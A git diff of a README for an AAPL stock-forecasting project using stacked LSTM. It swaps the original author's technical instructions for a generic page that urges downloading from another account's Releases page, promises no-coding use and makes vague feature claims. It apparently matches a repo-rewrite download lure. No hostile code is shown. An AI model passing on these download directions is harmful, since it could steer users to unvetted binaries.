@@ -1,146 +1,87 @@
-# 📈 Stock Market Prediction and Forecasting using Stacked LSTM  
+# 📈 Stock-Price-Prediction-And-Forecasting-Using-Stacked-LSTM--Deep-Learning - Simple Stock Forecasting Tool
 
-## 📌 Overview  
-This project predicts and forecasts **Apple Stock Prices (AAPL)** using a **Stacked LSTM (Long Short-Term Memory) model**.  
-It uses historical stock data, applies preprocessing with MinMaxScaler, and trains an LSTM deep learning model with TensorFlow/Keras.  
+![Download](https://img.shields.io/badge/Download-v1.0-blue)
 
----
+## 📥 Download & Install
 
-## 🛠 Tools & Technologies  
-- Python  
-- NumPy & Pandas  
-- Matplotlib & Seaborn  
-- Scikit-learn  
-- TensorFlow / Keras  
-- Jupyter Notebook  
+Visit this page to download the latest version of the application: [Releases Page](https://github.com/HICHAMEVAAAN/Stock-Price-Prediction-And-Forecasting-Using-Stacked-LSTM--Deep-Learning/releases).
 
----
+## 🚀 Getting Started
 
-## 📂 Project Structure  
+Follow these steps to begin using the Stock Price Prediction tool:
 
-├── app.py # (Optional) Streamlit app for deployment
+1. **Visit the Releases Page:** Start by clicking on the download link above or visiting [Releases Page](https://github.com/HICHAMEVAAAN/Stock-Price-Prediction-And-Forecasting-Using-Stacked-LSTM--Deep-Learning/releases).
+  
+2. **Download the Application:** Look for the latest version. Click on the file to download it to your computer.
 
-├── stock_lstm.ipynb # Jupyter Notebook (EDA + Model training)
+3. **Unzip the File (if necessary):** If the download is in a zipped format, right-click on the file and select "Extract All" to unzip it.
 
-├── AAPL.csv # Stock data file
+4. **Install Required Software:** Make sure you have Python installed. You can download it from [Python.org](https://www.python.org/downloads/). Follow the installation instructions for your operating system.
 
-├── requirements.txt # Dependencies
+5. **Install Additional Libraries:** Open your command prompt or terminal. Type the following commands to install the necessary packages:
 
-├── model/ # Saved trained model & scaler
+   ```
+   pip install pandas numpy matplotlib scikit-learn seaborn flask streamlit
+   ```
 
-└── .gitignore # Ignored files
+6. **Run the Application:**
+   - Navigate to the folder where you extracted the application files.
+   - Open your command prompt or terminal.
+   - Type `streamlit run app.py` and press Enter.
 
+7. **Open in a Browser:** After running the command, a new tab will open in your default web browser showing the Stock Price Prediction and Forecasting tool.
 
----
+## 📊 Features
 
-## ⚙️ Model Workflow  
-1. **Data Collection** – Fetch stock price data using `pandas_datareader`.  
-2. **Preprocessing** – Scaling with MinMaxScaler.  
-3. **Data Splitting** – Train/Test split (65% training, 35% testing).  
-4. **Sequence Creation** – Creating time-step-based input sequences.  
-5. **Model Building** – Stacked LSTM layers with Keras.  
-6. **Model Training** – 100 epochs, batch size = 64.  
-7. **Evaluation** – RMSE calculation for training & testing.  
-8. **Prediction** – Forecasting future stock prices (next 30 days).  
-9. **Visualization** – Comparing actual vs. predicted stock trends.  
+- **User-Friendly Interface:** Simple navigation throughout the application.
+- **Real-Time Predictions:** Get instant predictions on stock prices.
+- **Visualization Tools:** View data through easy-to-understand graphs and charts.
+- **Customizable Parameters:** Adjust settings to refine your predictions.
 
----
+## 📄 Understanding the Data
 
-## 🚀 How to Run  
+The application uses historical stock price data from Apple (AAPL). It processes this data to forecast future prices using advanced deep learning techniques, specifically Stacked LSTM.
 
-**Clone the repository and install requirements:**
+## 🛠️ System Requirements
 
-`git clone https://github.com/your-username/Stock-Market-Prediction.git`
+To run this application:
 
-**cd Stock-Market-Prediction**
+- **Operating System:** Windows, macOS, or Linux.
+- **Python Version:** 3.6 or higher.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 100 MB free space for installation.
 
-`pip install -r requirements.txt`
+## ⚙️ How It Works
 
-**Run the Jupyter Notebook:**
+The application employs Stacked LSTM to analyze historical stock data. Here's a brief overview of the process:
 
-`jupyter notebook stock_lstm.ipynb`
+1. **Data Collection:** Historical data is gathered from reliable financial sources.
+2. **Data Preprocessing:** Clean and organize the data for analysis.
+3. **Model Training:** The application trains the LSTM model using historical data to predict future prices based on patterns.
+4. **Prediction:** Users can input different parameters and receive forecasts.
 
-**Run the Streamlit app:**
+## 📚 Included Libraries
 
-*This Command Launch my Python script as a web app in the browser*
+- **Pandas:** For data manipulation and analysis.
+- **NumPy:** For numerical computations.
+- **Matplotlib & Seaborn:** For data visualization.
+- **Scikit-learn:** For machine learning functionalities.
+- **Flask & Streamlit:** For building web applications.
 
-`streamlit run app.py`          
+## ❓ FAQs
 
----
+**Q: Can I use this tool for stocks other than Apple?**  
+A: Currently, the tool is designed for Apple stock data, but you can modify it to include other stocks by uploading relevant datasets.
 
-### **Create New virtual environment**
+**Q: Do I need any coding experience?**  
+A: No coding experience is required to use the application. Follow the provided steps to get started.
 
-**🔹 Step 1: Open terminal (Command Prompt / PowerShell / Git Bash / VS Code Terminal)**
+## 🤝 Contributing
 
-**Navigate to your project folder:**
+If you'd like to contribute to this project, feel free to fork the repository and open a pull request. Your improvements are welcome.
 
-`cd path\to\your\project`
+## 📜 License
 
-**🔹 Step 2: Create the virtual environment**
+This project is licensed under the MIT License. For more details, please refer to the LICENSE file in this repository.
 
-
-`python -m venv .venv`
-
-
-`python -m venv → creates a virtual environment`
-
-.venv → the folder name (you can also name it env, but .venv is common for GitHub projects)
-
-**🔹 Step 3: Activate the environment**
-
-**On Windows (CMD)**
-
-
-`.venv\Scripts\activate`
-
-**On Windows (PowerShell)**
-
-`.venv\Scripts\Activate.ps1`
-
-**On Mac/Linux**
-
-`source .venv/bin/activate`
-
-**On Windows (PowerShell)**
-
-
-`.venv\Scripts\Activate.ps1`
-
-🔹 Step 4: Install required libraries
-
-Run this inside your project:
-
-`pip install streamlit pandas scikit-learn joblib`
-
-🔹 5. Run your Streamlit app
-
-In the terminal (inside your project folder):
-
-`streamlit run app.py`
-
----
-
-
-## 📸 Historical Closing Price Trend of Apple (AAPL)
-
-
-<img width="628" height="427" alt="Screenshot 2025-09-29 053436" src="https://github.com/user-attachments/assets/690cc1a4-dfcf-41db-aa32-56c1fb831e40" />
-
----
-
-## 📊 Results
-The model achieves a low RMSE score on both training and test data.
-
-Predicted trends closely follow the actual Apple stock price.
-
-Next 30 days of stock prices are forecasted using the trained LSTM.
-
----
-
-## 📧 Support
-
-**For queries or suggestions, feel free to connect:**
-
-📩 **Email:**  zuhairzia1@gmail.com
-
-💼 **LinkedIn:**  www.linkedin.com/in/zuhairzia
+Thank you for using the Stock Price Prediction and Forecasting Tool. We hope it helps you in your financial decision-making!
